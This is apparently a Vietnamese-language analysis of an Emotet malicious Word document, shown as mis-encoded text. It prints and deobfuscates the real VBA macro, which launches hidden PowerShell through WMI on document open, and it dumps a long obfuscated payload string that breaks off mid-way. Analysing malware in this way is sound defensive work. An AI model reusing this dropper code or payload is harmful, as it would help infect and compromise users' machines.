1ï¸âƒ£ GetObject("winmgmts:\\.\root\cimv2") â†’ Káº¿t ná»‘i vá»›i WMI.

2ï¸âƒ£ objProcess.Create â†’ Táº¡o tiáº¿n trÃ¬nh má»›i báº±ng WMI.

3ï¸âƒ£ Cháº¡y PowerShell ngáº§m, táº£i xuá»‘ng vÃ  thá»±c thi mÃ£ Ä‘á»™c tá»« Internet.

# Emotet VBA Code Analysis

ChÃºng ta cáº§n xuáº¥t mÃ£ Ä‘á»ƒ phÃ¢n tÃ­ch thÃªm

```
olevba maldoc.doc > olevba.txt
```

![image alt](https://hackmd.io/_uploads/B1A2ucthkg.png)

MÃ£ rÃµ rÃ ng bá»‹ `xÃ¡o trá»™n ráº¥t nhiá»u`. ChÃºng ta sáº½ cáº§n báº¯t Ä‘áº§u loáº¡i bá» ráº¥t nhiá»u `mÃ£ rÃ¡c` láº·p Ä‘i láº·p láº¡i Ä‘á»ƒ cÃ³ thá»ƒ chá»‰ táº­p trung vÃ o cÃ¡c dÃ²ng cÃ³ liÃªn quan. ChÃºng ta sáº½ xem xÃ©t Ä‘iá»u nÃ y táº­p trung vÃ o tá»«ng chá»©c nÄƒng má»™t cÃ¡ch riÃªng biá»‡t

## PhÃ¢n tÃ­ch VBA MACRO S88ecjif1ml6

```
-------------------------------------------------------------------------------
VBA MACRO S88ecjif1ml6
in file: mal.doc - OLE stream: 'S88ecjif1ml6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Private Sub Document_open()
Wdggt43espeaai75g_ = Array(Tku0cz3_kk0tufj + "Vi4gxn59xnxkzzm15Rxleer34r5t8v Tobvo57prwmzbrlw9" + Skrxs1elp57_o, U3tlx2laojf13ppk, Bkc5re_xxwma.Xy1ql8qq3m9fwoxvz, W8khkof7lrcpbtr + "P7k0a_g9z8ir Y17elacettooplkjw Szsgtfms72msn Rdn3hl2todcn")
End Sub
```

ChÃºng ta cÃ³ má»™t phÆ°Æ¡ng thá»©c `Document_open` , lÃ  Ä‘iá»ƒm khá»Ÿi Ä‘áº§u Ä‘á»ƒ mÃ£ thá»±c thi . CÃ³ má»™t tham chiáº¿u Ä‘áº¿n function `Bkc5re_xxwma.Xy1ql8qq3m9fwoxvz` , Ä‘Ã¢y lÃ  sáº½ nÆ¡i ta phÃ¢n tÃ­ch tiáº¿p theo

## PhÃ¢n tÃ­ch VBA MACRO Bkc5re_xxwma

HÃ m cÃ³ 4 function chÃ­nh . CÃ¡c máº«u mÃ£ rÃ¡c láº·p láº¡i má»™t cÃ¡ch vÃ´ nghÄ©a , gÃ¡n biáº¿n nhÆ°ng khÃ´ng bao giá» Ä‘Æ°á»£c gá»i . MÃ£ chá»©a nhiá»u Ä‘oáº¡n code cÃ³ chá»©a hÃ m `mid()`

`Mid(A, B, 1)`: **Láº¥y 1 kÃ½ tá»± tá»« chuá»—i A báº¯t Ä‘áº§u tá»« vá»‹ trÃ­ B**.

LÃ m sáº¡ch mÃ£ báº±ng cÃ¡ch sá»­ dá»¥ng biá»ƒu thá»©c chÃ­nh quy (Regex)

```
.*Mid\(.*\)
```

`.*` : Khá»›p vá»›i báº¥t ká»³ kÃ½ tá»± nÃ o (ngoáº¡i trá»« xuá»‘ng dÃ²ng).
`Mid\(` : TÃ¬m tá»« `Mid(`, dáº¥u `\(` dÃ¹ng Ä‘á»ƒ `thoÃ¡t` `kÃ½ tá»± (`.
`.*\) `: Khá»›p vá»›i báº¥t ká»³ ná»™i dung nÃ o sau `Mid( `vÃ  káº¿t thÃºc báº±ng `)`.

Tiáº¿p tá»¥c lÃ m sáº¡ch code báº±ng cÃ¡ch loáº¡i bá» má»™t táº­p há»£p cÃ¡c dÃ²ng ngáº«u nhiÃªn khÃ¡c . CÃ¡c dÃ²ng nÃ y vÃ´ nghÄ©a vÃ  láº·p Ä‘i láº·p láº¡i

```
   Set mnnlkNhuiqgbjkas = ProtectedViewWindows
BrjMGGrzYB = TGTnmafMf + KQXpqbBVXw + lRzndUz + DZYRouLDX + CRfUmzi + BakDlhW
nVFWYX = BrjMGGrzYB + ADuSUmc + mJojcpUfH + PVCpqKY + YjJajajJSM
wMGGAO = nVFWYX + suITCfBFc
```

MÃ£ bÃ¢y giá» Ä‘Ã£ giáº£m Ä‘Ã¡ng ká»ƒ Ä‘i nhiá»u

```
Function Xy1ql8qq3m9fwoxvz()
On Error Resume Next
Fycmwxxdr9u2jm = 12
Hguzrzdi3qzkaorc4 = Jpyqbcmwe05t03m + Chr$(Fycmwxxdr9u2jm + (103))
G6_e19me06ggh9 = ", A :, A :w, A :i, A :nm, A :, A :gm, A :t, A :, A :" + Hguzrzdi3qzkaorc4 + ", A :, A ::, A :w, A :in, A :, A :3, A :2, A :_, A :" + Bkc5re_xxwma.M3sl9apgyan8k + ", A :ro, A :, A :ce, A :s, A :s, A :"
Rbgd8kh364erl = Jc1yuw7r38_4a5(G6_e19me06ggh9)
Set Ioyv20u9cnhfyah = CreateObject(Rbgd8kh364erl)
Ivvt_2x4qmasd8 = Q0cawbk07t3 + Rbgd8kh364erl + Hguzrzdi3qzkaorc4 + Bkc5re_xxwma.Ptvl917_3fhv4ghbhb + Bkc5re_xxwma.Ys_jgil82mmhf
Set Mmxw9h87r6ne0q_n5 = Jgcwzg_v1lujky5(Ivvt_2x4qmasd8 + Bkc5re_xxwma.M3sl9apgyan8k)
Ioyv20u9cnhfyah.Create Dlhbagxwt5vvo7ur, Crdajectd75a_ze, Mmxw9h87r6ne0q_n5
End Function
Function Jgcwzg_v1lujky5(Aat9psb6y4z_4fy)
On Error Resume Next
Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
Jgcwzg_v1lujky5. _
showwindow = wdKeyEquals - wdKeyEquals
End Function
Function Jc1yuw7r38_4a5(Brqcqtzjby3rhyk)
On Error Resume Next
Rkkl4izp8yq037 = CleanString(Brqcqtzjby3rhyk)
Lhene6fi97ra = Split(Rkkl4izp8yq037, ", A :")
Ox239biw5eyqve87i = Qd3ue1zobs9 + Join(Lhene6fi97ra, D1vtk4ty75k5z)
Jc1yuw7r38_4a5 = Ox239biw5eyqve87i
End Function
Function Dlhbagxwt5vvo7ur()
On Error Resume Next
O0hx59lf0mc51 = "POW" + "eR" + "sHe"
Bg6i7gcz1j38udj0 = S88ecjif1ml6.Content.Text
Ah_ap6yelik = Right(Bg6i7gcz1j38udj0, Len(Bg6i7gcz1j38udj0) - 1)
Dlhbagxwt5vvo7ur = Jc1yuw7r38_4a5(O0hx59lf0mc51 + Ah_ap6yelik)
End Function
```

Tuy nhiÃªn, khi chÃºng ta nhÃ¬n vÃ o cÃ¡c biáº¿n, vÃ­ dá»¥ nhÆ° `Bkc5re_xxwma. M3sl9apgyan8k` nÃ³ khÃ´ng tá»“n táº¡i trong hÃ m hiá»‡n táº¡i. Tuy nhiÃªn, má»™t sá»‘ trong sá»‘ chÃºng xuáº¥t hiá»‡n trong `form` . ÄÃ¢y lÃ  nÆ¡i nhá»¯ng káº» táº¥n cÃ´ng cáº¥t giá»¯ má»™t vÃ i máº£nh ghÃ©p

```
-------------------------------------------------------------------------------
VBA FORM Variable "b'M3sl9apgyan8k'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'P'
-------------------------------------------------------------------------------
```

`b'M3sl9apgyan8k'` : ÄÃ¢y lÃ  má»™t biáº¿n cá»§a Form trong VBA, Ä‘Æ°á»£c trÃ­ch xuáº¥t tá»« tÃ i liá»‡u `mal.doc`. Mang giÃ¡ trá»‹ lÃ  `P`

Táº­p lá»‡nh nÃ y ná»‘i cÃ¡c chuá»—i vÃ  chuyá»ƒn chÃºng Ä‘áº¿n hÃ m `Jc1yuw7r38_4a5`

```
Fycmwxxdr9u2jm = 12
Hguzrzdi3qzkaorc4 = Jpyqbcmwe05t03m + Chr$(Fycmwxxdr9u2jm + (103))
G6_e19me06ggh9 = ", A :, A :w, A :i, A :nm, A :, A :gm, A :t, A :, A :" + Hguzrzdi3qzkaorc4 + ", A :, A ::, A :w, A :in, A :, A :3, A :2, A :_, A :" + Bkc5re_xxwma.M3sl9apgyan8k + ", A :ro, A :, A :ce, A :s, A :s, A :"
Rbgd8kh364erl = Jc1yuw7r38_4a5(G6_e19me06ggh9)
```

Táº¥t cáº£ nhá»¯ng gÃ¬ Ä‘iá»u nÃ y thá»±c sá»± lÃ m lÃ  láº¥y kÃ½ tá»± `115 (12 +103)`, lÃ  chá»¯ "s" trong bá»™ kÃ½ tá»± ASCII vÃ  gÃ¡n nÃ³ cho má»™t biáº¿n sau Ä‘Ã³ Ä‘Æ°á»£c sá»­ dá»¥ng trong chuá»—i ná»‘i sau . Chuá»—i nÃ y sau Ä‘Ã³ Ä‘Æ°á»£c chuyá»ƒn vÃ o hÃ m `Jc1yuw7r38_4a5`, táº¥t cáº£ nhá»¯ng gÃ¬ nÃ³ lÃ m lÃ  má»™t hÃ m phÃ¢n tÃ¡ch Ä‘á»ƒ `loáº¡i bá» chuá»—i ", A :"`, xuáº¥t hiá»‡n ráº¥t nhiá»u trong chuá»—i Ä‘Æ°á»£c hiá»ƒn thá»‹ á»Ÿ trÃªn.

```
Function Jc1yuw7r38_4a5(Brqcqtzjby3rhyk)
On Error Resume Next
Rkkl4izp8yq037 = CleanString(Brqcqtzjby3rhyk)
Lhene6fi97ra = Split(Rkkl4izp8yq037, ", A :")   'tÃ¡ch chuá»—i thÃ nh máº£ng cÃ¡c chuá»—i con, má»—i chuá»—i con Ä‘Æ°á»£c tÃ¡ch bá»Ÿi chuá»—i ", A :"
Ox239biw5eyqve87i = Qd3ue1zobs9 + Join(Lhene6fi97ra, D1vtk4ty75k5z)  'ná»‘i cÃ¡c chuá»—i con thÃ nh má»™t chuá»—i má»›i, má»—i chuá»—i con Ä‘Æ°á»£c ná»‘i bá»Ÿi chuá»—i D1vtk4ty75k5z'
Jc1yuw7r38_4a5 = Ox239biw5eyqve87i
End Function
```

Chuá»—i sau khi phÃ¢n tÃ¡ch

```
G6_e19me06ggh9 = "winmgmt" + "s" + ":win32_" + "p" + "rocess"
```

NÃ³ láº¯p rÃ¡p chuá»—i Ä‘á»ƒ cÃ³ Ä‘Æ°á»£c Ä‘á»‘i tÆ°á»£ng `winmgmts:win32_process`, Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ `táº¡o má»™t quy trÃ¬nh má»›i`. Sau khi thay tháº¿ má»™t sá»‘ biáº¿n Ä‘Ã³, cÃ¡c dÃ²ng sau cÃ³ thá»ƒ trÃ´ng nhÆ° sau:

```
Set Ioyv20u9cnhfyah = CreateObject("winmgmts:win32_process")
Ivvt_2x4qmasd8 = Q0cawbk07t3 + "winmgmts:win32_process" + "s" + "tar" + "tu"
Set Mmxw9h87r6ne0q_n5 = Jgcwzg_v1lujky5("winmgmts:win32_process" + "s" + "tar" + "tu" + "p")
Ioyv20u9cnhfyah.Create Dlhbagxwt5vvo7ur, Crdajectd75a_ze, Mmxw9h87r6ne0q_n5
```

Má»™t Ä‘á»‘i tÆ°á»£ng `win32_process` Ä‘Æ°á»£c táº¡o ra , sau Ä‘Ã³ lÃ  2 dÃ²ng khÃ´ng lÃ m gÃ¬ cáº£ , dÃ²ng cuá»‘i cÃ¹ng lÃ  nÆ¡i thá»±c hiá»‡n malicous . PhÆ°Æ¡ng thá»©c `Create` cá»§a `win32_process` Ä‘Æ°á»£c gá»i . BÃ¢y giá» chá»‰ cáº§n tÃ¬m `Dlhbagxwt5vvo7ur` Ä‘Æ°á»£c truyá»n vÃ o lÃ  gÃ¬ . ÄÃ¢y lÃ  má»™t tham chiáº¿u Ä‘áº¿n má»™t function á»Ÿ bÃªn dÆ°á»›i

```
Function Dlhbagxwt5vvo7ur()
On Error Resume Next
O0hx59lf0mc51 = "POW" + "eR" + "sHe"
Bg6i7gcz1j38udj0 = S88ecjif1ml6.Content.Text
Ah_ap6yelik = Right(Bg6i7gcz1j38udj0, Len(Bg6i7gcz1j38udj0) - 1)
Dlhbagxwt5vvo7ur = Jc1yuw7r38_4a5(O0hx59lf0mc51 + Ah_ap6yelik)
End Function
```

ChÃºng ta Ä‘Ã£ cÃ³ thá»ƒ tháº¥y ráº±ng chuá»—i `"POWeRsHe"` Ä‘ang Ä‘Æ°á»£c ná»‘i . Ná»‘i vá»›i ná»™i dung tá»« biáº¿n `S88ecjif1ml6.Content.Text` sau Ä‘Ã³ truyá»n vÃ o hÃ m `Jc1yuw7r38_4a5` nÆ¡i loáº¡i bá» cÃ¡c máº«u chá»©a chuá»—i `", A:"`

Má»¥c Ä‘Ã­ch cá»§a toÃ n bá»™ mÃ£ VBA lÃ  `thá»±c thi PowerShell`, nhÆ°ng chÃºng ta váº«n cáº§n tÃ¬m `payload` cá»§a mÃ¬nh. Cho Ä‘áº¿n nay, nhá»¯ng gÃ¬ chÃºng ta cÃ³ lÃ :

```
CreateObject("winmgmts:win32_process").Create POWeRsHe + S88ecjif1ml6.Content.Text
```

## Giáº£i mÃ£ payload

Biáº¿n `S88ecjif1ml6.Content.Text` vá» cÆ¡ báº£n bao gá»“m `ná»™i dung tá»« tÃ i liá»‡u Word`. Ta cÃ³ thá»ƒ má»Ÿ tÃ i liá»‡u Ä‘á»ƒ truy xuáº¥t vÄƒn báº£n, nhÆ°ng ta cÅ©ng nhá»› ráº±ng trÆ°á»›c Ä‘Ã³ ta Ä‘Ã£ tháº¥y má»™t chuá»—i ráº¥t dÃ i vá»›i má»™t máº«u Ä‘Ã¡ng ngá».

```
strings -n 400 maldoc.doc > contents.txt
```

```
, A :, A :L, A :L, A : , A :-, A :E, A :N, A :C, A :O, A :D, A : , A : , A : , A : , A : , A : , A : , A : , A : , A : , A : , A : , A : , A : , A : , A : , A : JA, A :BQ, A :AG, A :gA, A :YQ, A :A5, A :AG, A :4A, A :OA, A :Bz, A :AD, A :0A, A :KA, A :An, A :AF, A :EA, A :Jw, A :Ar, A :AC, A :cA, A :bA, A :An, A :AC, A :sA, A :KA, A :An, A :AD, A :gA, A :Jw, A :Ar, A :AC, A :cA, A :bw, A :Bf, A :AG, A :YA, A :aA, A :An, A :AC, A :kA, A :KQ, A :A7, A :AC, A :4A, A :KA, A :An, A :AG, A :4A, A :Jw, A :Ar, A :AC, A :cA, A :ZQ, A :B3, A :AC, A :0A, A :aQ, A :B0, A :AG, A :UA, A :bQ, A :An, A :AC, A :kA, A :IA, A :Ak, A :AE, A :UA, A :Tg, A :BW, A :AD, A :oA, A :VQ, A :Bz, A :AG, A :UA, A :Ug, A :BQ, A :AF, A :IA, A :Tw, A :BG, A :AE, A :kA, A :bA, A :BF, A :AF, A :wA, A :Vw, A :Bn, A :AF, A :8A, A :Xw, A :Az, A :AE, A :0A, A :RA, A :Bc, A :AH, A :YA, A :UA, A :Bu, A :AH, A :kA, A :Mg, A :A0, A :AF, A :YA, A :XA, A :Ag, A :AC, A :0A, A :aQ, A :B0, A :AG, A :UA, A :bQ, A :B0, A :AH, A :kA, A :cA, A :Bl, A :AC, A :AA, A :RA, A :BJ, A :AF, A :IA, A :RQ, A :BD, A :AH, A :QA, A :Tw, A :By, A :AF, A :kA, A :Ow, A :Bb, A :AE, A :4A, A :ZQ, A :B0, A :AC, A :4A, A :Uw, A :Bl, A :AH, A :IA, A :dg, A :Bp, A :AG, A :MA, A :ZQ, A :BQ, A :AG, A :8A, A :aQ, A :Bu, A :AH, A :QA, A :TQ, A :Bh, A :AG, A :4A, A :YQ, A :Bn, A :AG, A :UA, A :cg, A :Bd, A :AD, A :oA, A :Og, A :Ai, A :AH, A :MA, A :ZQ, A :Bj, A :AH, A :UA, A :Ug, A :BJ, A :AH, A :QA, A :YA, A :BZ, A :AG, A :AA, A :cA, A :By, A :AE, A :8A, A :dA, A :Bv, A :AE, A :MA, A :bw, A :Bs, A :AC, A :IA, A :IA, A :A9, A :AC, A :AA, A :KA, A :An, A :AH, A :QA, A :bA, A :An, A :AC, A :sA, A :KA, A :An, A :AH, A :MA, A :Jw, A :Ar, A :AC, A :cA, A :MQ, A :Ay, A :AC, A :wA, A :IA, A :An, A :AC, A :sA, A :Jw, A :B0, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :Bs, A :AH, A :MA, A :Jw, A :Ar, A :AC, A :cA, A :MQ, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :MQ, A :An, A :AC, A :sA, A :Jw, A :As, A :AC, A :AA, A :dA, A :An, A :AC, A :kA, A :Kw, A :An, A :AG, A :wA, A :Jw, A :Ar, A :AC, A :cA, A :cw, A :An, A :AC, A :kA, A :Ow, A :Ak, A :AE, A :wA, A :bg, A :Bj, A :AD, A :gA, A :Yw, A :Bs, A :AH, A :kA, A :IA, A :A9, A :AC, A :AA, A :KA, A :Ao, A :AC, A :cA, A :Wg, A :An, A :AC, A :sA, A :Jw, A :Bj, A :AD, A :EA, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AG, A :8A, A :Jw, A :Ar, A :AC, A :cA, A :Ng, A :Bs, A :AC, A :cA, A :KQ, A :Ap, A :AD, A :sA, A :JA, A :BI, A :AG, A :EA, A :dg, A :Br, A :AG, A :MA, A :YQ, A :Bk, A :AD, A :0A, A :KA, A :An, A :AF, A :IA, A :Mw, A :An, A :AC, A :sA, A :KA, A :An, A :AD, A :EA, A :bQ, A :A2, A :AG, A :wA, A :Jw, A :Ar, A :AC, A :cA, A :Mg, A :An, A :AC, A :kA, A :KQ, A :A7, A :AC, A :QA, A :UA, A :Bl, A :AD, A :EA, A :ZQ, A :By, A :AG, A :4A, A :Mg, A :A9, A :AC, A :QA, A :ZQ, A :Bu, A :AH, A :YA, A :Og, A :B1, A :AH, A :MA, A :ZQ, A :By, A :AH, A :AA, A :cg, A :Bv, A :AG, A :YA, A :aQ, A :Bs, A :AG, A :UA, A :Kw, A :Ao, A :AC, A :gA, A :KA, A :An, A :AE, A :sA, A :Jw, A :Ar, A :AC, A :cA, A :Yg, A :BR, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :cA, A :Vw, A :Bn, A :AC, A :cA, A :Kw, A :An, A :AF, A :8A, A :Xw, A :An, A :AC, A :sA, A :KA, A :An, A :AD, A :MA, A :bQ, A :Bk, A :AC, A :cA, A :Kw, A :An, A :AE, A :sA, A :Yg, A :An, A :AC, A :sA, A :Jw, A :BR, A :AF, A :YA, A :cA, A :Bu, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :B5, A :AD, A :IA, A :Jw, A :Ar, A :AC, A :cA, A :NA, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :dg, A :An, A :AC, A :sA, A :Jw, A :BL, A :AG, A :IA, A :Jw, A :Ap, A :AC, A :sA, A :Jw, A :BR, A :AC, A :cA, A :KQ, A :Ag, A :AC, A :AA, A :LQ, A :BS, A :AG, A :UA, A :UA, A :BM, A :AE, A :EA, A :Qw, A :Bl, A :AC, A :AA, A :IA, A :Ao, A :AC, A :cA, A :Sw, A :Bi, A :AC, A :cA, A :Kw, A :An, A :AF, A :EA, A :Jw, A :Ap, A :AC, A :wA, A :Ww, A :Bj, A :AE, A :gA, A :YQ, A :By, A :AF, A :0A, A :OQ, A :Ay, A :AC, A :kA, A :Kw, A :Ak, A :AE, A :wA, A :bg, A :Bj, A :AD, A :gA, A :Yw, A :Bs, A :AH, A :kA, A :Kw, A :Ao, A :AC, A :gA, A :Jw, A :Au, A :AG, A :UA, A :Jw, A :Ar, A :AC, A :cA, A :eA, A :An, A :AC, A :kA, A :Kw, A :An, A :AG, A :UA, A :Jw, A :Ap, A :AD, A :sA, A :JA, A :Ba, A :AH, A :oA, A :Ng, A :Bu, A :AH, A :EA, A :cA, A :Ax, A :AD, A :0A, A :KA, A :An, A :AF, A :MA, A :aQ, A :An, A :AC, A :sA, A :KA, A :An, A :AG, A :4A, A :eQ, A :B5, A :AC, A :cA, A :Kw, A :An, A :AG, A :MA, A :aA, A :An, A :AC, A :kA, A :KQ, A :A7, A :AC, A :QA, A :RQ, A :A3, A :AD, A :IA, A :dw, A :Bi, A :AG, A :QA, A :YQ, A :A9, A :AC, A :4A, A :KA, A :An, A :AG, A :4A, A :Jw, A :Ar, A :AC, A :cA, A :ZQ, A :B3, A :AC, A :0A, A :bw, A :Bi, A :AG, A :oA, A :Jw, A :Ar, A :AC, A :cA, A :ZQ, A :Bj, A :AC, A :cA, A :Kw, A :An, A :AH, A :QA, A :Jw, A :Ap, A :AC, A :AA, A :bg, A :BF, A :AF, A :QA, A :Lg, A :B3, A :AG, A :UA, A :Yg, A :Bj, A :AE, A :wA, A :aQ, A :Bl, A :AE, A :4A, A :VA, A :A7, A :AC, A :QA, A :TQ, A :Bu, A :AH, A :YA, A :bg, A :Ay, A :AG, A :MA, A :Yg, A :A9, A :AC, A :gA, A :KA, A :An, A :AG, A :gA, A :Jw, A :Ar, A :AC, A :cA, A :dA, A :B0, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :Bw, A :AD, A :oA, A :Jw, A :Ar, A :AC, A :cA, A :Lw, A :Av, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :Bw, A :AH, A :IA, A :ZQ, A :An, A :AC, A :sA, A :Jw, A :Bz, A :AH, A :QA, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AG, A :8A, A :aw, A :An, A :AC, A :sA, A :Jw, A :Bp, A :AH, A :QA, A :Yw, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :aA, A :Bl, A :AC, A :cA, A :Kw, A :An, A :AG, A :4A, A :cw, A :Au, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :Bj, A :AC, A :cA, A :Kw, A :An, A :AG, A :8A, A :bQ, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :Lw, A :By, A :AC, A :cA, A :Kw, A :An, A :AG, A :UA, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AG, A :MA, A :dQ, A :By, A :AC, A :cA, A :Kw, A :An, A :AH, A :IA, A :Jw, A :Ap, A :AC, A :sA, A :Jw, A :Bp, A :AC, A :cA, A :Kw, A :An, A :AG, A :4A, A :Jw, A :Ar, A :AC, A :cA, A :Zw, A :Bv, A :AC, A :cA, A :Kw, A :Ao, A :AC, A :cA, A :Lw, A :An, A :AC, A :sA, A :Jw, A :Bm, A :AF, A :IA, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AG, A :UA, A :Jw, A :Ar, A :AC, A :cA, A :Lw, A :Aq, A :AG, A :gA, A :dA, A :B0, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :cA, A :cA, A :An, A :AC, A :sA, A :KA, A :An, A :AD, A :oA, A :Lw, A :Av, A :AC, A :cA, A :Kw, A :An, A :AH, A :cA, A :Jw, A :Ar, A :AC, A :cA, A :dw, A :B3, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :Au, A :AC, A :cA, A :Kw, A :An, A :AG, A :QA, A :ag, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :cg, A :An, A :AC, A :sA, A :Jw, A :Bh, A :AG, A :kA, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AH, A :MA, A :bw, A :By, A :AC, A :4A, A :Jw, A :Ar, A :AC, A :cA, A :Yw, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :bw, A :An, A :AC, A :sA, A :Jw, A :Bt, A :AC, A :8A, A :ZQ, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :cg, A :An, A :AC, A :sA, A :Jw, A :By, A :AG, A :8A, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AH, A :IA, A :Jw, A :Ar, A :AC, A :cA, A :Lw, A :B3, A :AD, A :cA, A :Rw, A :An, A :AC, A :kA, A :Kw, A :An, A :AD, A :MA, A :Lw, A :An, A :AC, A :sA, A :KA, A :An, A :AC, A :oA, A :Jw, A :Ar, A :AC, A :cA, A :aA, A :B0, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :B0, A :AH, A :AA, A :Jw, A :Ar, A :AC, A :cA, A :Og, A :Av, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :Av, A :AG, A :QA, A :Jw, A :Ar, A :AC, A :cA, A :YQ, A :An, A :AC, A :kA, A :Kw, A :An, A :AG, A :sA, A :YQ, A :An, A :AC, A :sA, A :Jw, A :By, A :AC, A :cA, A :Kw, A :Ao, A :AC, A :cA, A :Yg, A :B1, A :AH, A :oA, A :eg, A :Au, A :AC, A :cA, A :Kw, A :An, A :AG, A :4A, A :ZQ, A :An, A :AC, A :sA, A :Jw, A :B0, A :AC, A :8A, A :Yw, A :Bz, A :AC, A :cA, A :Kw, A :An, A :AH, A :MA, A :Lw, A :An, A :AC, A :sA, A :Jw, A :BD, A :AH, A :kA, A :Sw, A :An, A :AC, A :sA, A :Jw, A :Bn, A :AC, A :8A, A :Jw, A :Ar, A :AC, A :cA, A :Kg, A :Bo, A :AH, A :QA, A :Jw, A :Ap, A :AC, A :sA, A :Jw, A :B0, A :AH, A :AA, A :Jw, A :Ar, A :AC, A :cA, A :cw, A :An, A :AC, A :sA, A :Jw, A :A6, A :AC, A :cA, A :Kw, A :Ao, A :AC, A :cA, A :Lw, A :Av, A :AC, A :cA, A :Kw, A :An, A :AH, A :cA, A :aQ, A :Bs, A :AC, A :cA, A :Kw, A :An, A :AG, A :QA, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AG, A :UA, A :Jw, A :Ar, A :AC, A :cA, A :Yw, A :Bh, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :cA, A :cA, A :An, A :AC, A :sA, A :Jw, A :Bp, A :AH, A :QA, A :Jw, A :Ar, A :AC, A :gA, A :Jw, A :Bh, A :AC, A :cA, A :Kw, A :An, A :AG, A :wA, A :bQ, A :Bn, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :cA, A :bQ, A :B0, A :AC, A :cA, A :Kw, A :Ao, A :AC, A :cA, A :Lg, A :An, A :AC, A :sA, A :Jw, A :Bu, A :AC, A :cA, A :Kw, A :An, A :AG, A :UA, A :dA, A :Av, A :AH, A :cA, A :Jw, A :Ar, A :AC, A :cA, A :cA, A :At, A :AG, A :MA, A :bw, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :bg, A :B0, A :AG, A :UA, A :bg, A :An, A :AC, A :sA, A :Jw, A :B0, A :AC, A :8A, A :Jw, A :Ar, A :AC, A :cA, A :ag, A :An, A :AC, A :kA, A :Kw, A :An, A :AD, A :YA, A :Jw, A :Ar, A :AC, A :gA, A :Jw, A :Av, A :AC, A :oA, A :aA, A :An, A :AC, A :sA, A :Jw, A :B0, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :gA, A :Jw, A :B0, A :AH, A :AA, A :Jw, A :Ar, A :AC, A :cA, A :Og, A :An, A :AC, A :kA, A :Kw, A :An, A :AC, A :8A, A :Jw, A :Ar, A :AC, A :gA, A :Jw, A :Av, A :AC, A :cA, A :Kw, A :An, A :AG, A :MA, A :YQ, A :Bs, A :AC, A :cA, A :Kw, A :An, A :AG, A :kA, A :Zg, A :Bv, A :AH, A :IA, A :Jw, A :Ap, A :AC, A :sA, A :KA, A :An, A :AG, A :4A, A :aQ, A :Bh, A :AG, A :EA, A :cw, A :Bh, A :AC, A :cA, A :Kw, A :An, A :AC, A :4A, A :Yw, A :Bv, A :AG, A :0A, A :Lw, A :Bj, A :AG, A :EA, A :Jw, A :Ar, A :AC, A :cA, A :bA, A :Bp, A :AG, A :YA, A :Jw, A :Ar, A :AC, A :cA, A :bw, A :An, A :AC, A :kA, A :Kw, A :An, A :AH, A :IA, A :bg, A :An, A :AC, A :sA, A :KA, A :An, A :AG, A :kA, A :YQ, A :An, A :AC, A :sA, A :Jw, A :Bh, A :AH, A :MA, A :YQ, A :An, A :AC, A :kA, A :Kw, A :An, A :AC, A :4A, A :Yw, A :An, A :AC, A :sA, A :Jw, A :Bv, A :AG, A :0A, A :Jw, A :Ar, A :AC, A :gA, A :Jw, A :Av, A :AC, A :cA, A :Kw, A :An, A :AD, A :gA, A :dA, A :An, A :AC, A :kA, A :Kw, A :Ao, A :AC, A :cA, A :Lw, A :An, A :AC, A :sA, A :Jw, A :Aq, A :AG, A :gA, A :Jw, A :Ap, A :AC, A :sA, A :Jw, A :B0, A :AH, A :QA, A :Jw, A :Ar, A :AC, A :gA, A :Jw, A :Bw, A :AD, A :oA, A :Lw, A :Av, A :AH, A :YA, A :Jw, A :Ar, A :AC, A :cA, A :aQ, A :By, A :AC, A :cA, A :KQ, A :Ar, A :AC, A :cA, A :YQ, A :An, A :AC, A :sA, A :KA, A :An, A :AG, A :wA, A :Jw, A :Ar, A :AC, A :cA, A :Yg, A :By, A :AG, A :8A, A :dw, A :An, A :AC, A :sA, A :Jw, A :Bu, A :AC, A :4A, A :Jw, A :Ar, A :AC, A :cA, A :Yw, A :Bv, A :AG, A :0A, A :Lw, A :Bl, A :AC, A :cA, A :Kw, A :An, A :AD, A :MA, A :Yw, A :An, A :AC, A :kA, A :Kw, A 